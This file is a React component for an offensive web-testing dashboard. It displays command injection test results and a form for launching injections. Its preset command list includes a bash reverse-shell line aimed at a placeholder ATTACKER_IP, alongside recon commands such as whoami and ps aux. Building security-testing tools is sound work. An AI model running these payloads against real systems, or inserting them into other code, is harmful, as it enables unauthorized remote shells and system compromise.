import type { WebsiteAttackData } from '../types/website-attack';
import React, { useState } from 'react';
import { cn } from '../../../../../../../shared/lib/utils';

function SectionHeader({ accent = '#0af', children }: { accent?: string; children: React.ReactNode }) {
  return (
    <div className="flex items-center gap-2 mb-2">
      <div className="w-1 h-4 rounded-full" style={{ backgroundColor: accent }} />
      <h3 className="text-[12px] font-bold uppercase tracking-[0.1em] text-[#c8d6f0] font-mono">{children}</h3>
    </div>
  );
}

function KV({ k, v, vc = 'text-[#c8d6f0]' }: { k: string; v: string | number | React.ReactNode; vc?: string }) {
  return (
    <div className="flex justify-between items-center py-1 border-b border-[#111827] last:border-0">
      <span className="text-[11px] font-mono text-[#c8d6f0] uppercase tracking-wide">{k}</span>
      <span className={cn('text-[12px] font-mono', vc)}>{v}</span>
    </div>
  );
}

function StatBox({ label, value, sub, accent }: { label: string; value: string | number; sub?: string; accent: string }) {
  return (
    <div className="bg-[#0d1017] border border-[#1c2333] rounded p-2.5 flex flex-col gap-0.5">
      <span className="text-[10px] uppercase tracking-widest font-mono text-[#c8d6f0]">{label}</span>
      <span className="text-[16px] font-bold font-mono leading-none" style={{ color: accent }}>{value}</span>
      {sub && <span className="text-[9px] font-mono text-[#c8d6f0]">{sub}</span>}
    </div>
  );
}

function StatusBadge({ status }: { status: string }) {
  const config: Record<string, { color: string; label: string }> = {
    success: { color: '#30d158', label: 'SUCCESS' }, failed: { color: '#ff2d55', label: 'FAILED' },
    pending: { color: '#f5a623', label: 'PENDING' }, running: { color: '#0af', label: 'RUNNING' },
  };
  const c = config[status] || { color: '#4a5a7a', label: status.toUpperCase() };
  return <span className="text-[9px] font-bold font-mono uppercase px-1.5 py-0.5 rounded-sm" style={{ color: c.color, border: `1px solid ${c.color}40`, background: `${c.color}12` }}>{c.label}</span>;
}

function ExpandableRaw({ content }: { content: string }) {
  const [expanded, setExpanded] = React.useState(false);
  const preview = content.split('\n').slice(0, 4).join('\n');
  return (
    <div className="mt-2">
      <pre className="text-[10px] font-mono text-[#5a6a8a] bg-[#0a0e14] p-2 rounded overflow-x-auto whitespace-pre-wrap">{expanded ? content : preview}</pre>
      {content.split('\n').length > 4 && <button onClick={() => setExpanded(!expanded)} className="text-[10px] font-mono text-[#0af] hover:text-[#5cf] mt-1">{expanded ? 'Show less' : 'Show more'}</button>}
    </div>
  );
}

const COMMON_COMMANDS = [
  { label: 'Whoami', cmd: 'whoami' },
  { label: 'ID', cmd: 'id' },
  { label: 'List Files', cmd: 'ls -la' },
  { label: 'Network Info', cmd: 'ifconfig' },
  { label: 'Process List', cmd: 'ps aux' },
  { label: 'Reverse Shell (bash)', cmd: 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1' },
];

export function CommandInjection({ data }: { data: WebsiteAttackData }) {
  const results = data.commandInjectionResults;
  const successCount = results.filter(r => r.status === 'success' && r.vulnerable).length;

  return (
    <div className="flex-1 overflow-y-auto p-3">
      <div className="grid grid-cols-2 gap-2">
        <div className="col-span-2 grid grid-cols-4 gap-2 mb-1">
          <StatBox label="Tests Run" value={results.length} sub="cmd injection" accent="#0af" />
          <StatBox label="Vulnerable" value={successCount} sub="confirmed RCE" accent="#ff2d55" />
          <StatBox label="Commands Run" value={results.filter(r => r.commandOutput).length} sub="executed" accent="#30d158" />
          <StatBox label="Method" value={[...new Set(results.map(r => r.config.method))].join(', ') || '—'} sub="" accent="#f5a623" />
        </div>

        {results.length === 0 ? (
          <div className="col-span-2 bg-[#0d1017] border border-[#1c2333] rounded p-6 text-center">
            <div className="text-[32px] opacity-15 mb-2">💻</div>
            <div className="text-[11px] font-mono text-[#c8d6f0]">No command injection tests run yet</div>
            <div className="text-[10px] font-mono text-[#2a3548] mt-1">Supports: OS Command Injection, Blind, Time-based detection</div>
          </div>
        ) : (
          results.map((result, idx) => (
            <div key={idx} className="bg-[#0d1017] border border-[#1c2333] rounded p-3 col-span-2">
              <div className="flex items-center justify-between mb-2">
                <div className="flex items-center gap-2">
                  <SectionHeader accent={result.vulnerable ? '#30d158' : '#ff2d55'}>{result.name}</SectionHeader>
                  <StatusBadge status={result.status} />
                  <span className="text-[9px] font-mono px-1.5 py-0.5 rounded bg-[#0af12] text-[#0af] border border-[#0af30]">{result.config.method || 'GET'}</span>
                  {result.vulnerable && <span className="text-[9px] font-mono px-1.5 py-0.5 rounded bg-[#ff2d5512] text-[#ff2d55] border border-[#ff2d5530]">VULNERABLE</span>}
                </div>
                <span className="text-[10px] font-mono text-[#c8d6f0]">{new Date(result.timestamp).toLocaleString()}</span>
              </div>

              <div className="grid grid-cols-2 gap-2">
                <div className="bg-[#0a0e14] border border-[#111827] rounded p-2">
                  <div className="text-[10px] font-mono text-[#c8d6f0] uppercase mb-1">Configuration</div>
                  <KV k="URL" v={result.config.url} vc="text-[#0af]" />
                  <KV k="Parameter" v={result.config.parameter} vc="text-[#f5a623]" />
                  <KV k="Command" v={result.config.command} vc="text-[#ff2d55]" />
                  <KV k="Method" v={result.config.method || 'GET'} />
                </div>
                <div className="bg-[#0a0e14] border border-[#111827] rounded p-2">
                  <div className="text-[10px] font-mono text-[#c8d6f0] uppercase mb-1">Results</div>
                  <KV k="Vulnerable" v={result.vulnerable ? 'YES ✓' : 'NO ✗'} vc={result.vulnerable ? 'text-[#30d158]' : 'text-[#ff2d55]'} />
                  {result.commandOutput && <KV k="Output" v={result.commandOutput} vc="text-[#30d158]" />}
                </div>
              </div>

              {result.output && (
                <div className="mt-2 bg-[#0a0e14] border border-[#111827] rounded p-2">
                  <div className="text-[10px] font-mono text-[#c8d6f0] uppercase mb-1">Output</div>
                  <ExpandableRaw content={result.output} />
                </div>
              )}
            </div>
          ))
        )}

        <div className="bg-[#0d1017] border border-[#1c2333] rounded p-3 col-span-2">
          <SectionHeader accent="#ff2d55">Launch Command Injection</SectionHeader>
          <div className="grid grid-cols-2 gap-2 mb-2">
            <div className="col-span-2">
              <label className="text-[10px] font-mono text-[#c8d6f0] uppercase block mb-1">Target URL</label>
              <input type="text" defaultValue={data.targetUrl + '/ping.php?ip=127.0.0.1'} className="w-full h-7 bg-[#040608] border border-[#1c2333] rounded px-2 text-[11px] font-mono text-[#0af] outline-none" style={{ caretColor: '#0af' }} />
            </div>
            <div>
              <label className="text-[10px] font-mono text-[#c8d6f0] uppercase block mb-1">Command Preset</label>
              <select className="w-full h-7 bg-[#040608] border border-[#1c2333] rounded px-2 text-[11px] font-mono text-[#c8d6f0] outline-none">
                {COMMON_COMMANDS.map((c, i) => <option key={i} value={c.cmd}>{c.label}</option>)}
              </select>
            </div>
            <div>
              <label className="text-[10px] font-mono text-[#c8d6f0] uppercase block mb-1">Custom Command</label>
              <input type="text" placeholder="whoami" className="w-full h-7 bg-[#040608] border border-[#1c2333] rounded px-2 text-[11px] font-mono text-[#ff2d55] outline-none placeholder:text-[#2a3548]" style={{ caretColor: '#ff2d55' }} />
            </div>
          </div>
          <button className="h-8 px-4 rounded text-[11px] font-bold font-mono transition-colors" style={{ background: '#ff2d5515', border: '1px solid #ff2d5530', color: '#ff2d55' }}>💻 Launch Command Injection</button>
        </div>
      </div>
    </div>
  );
}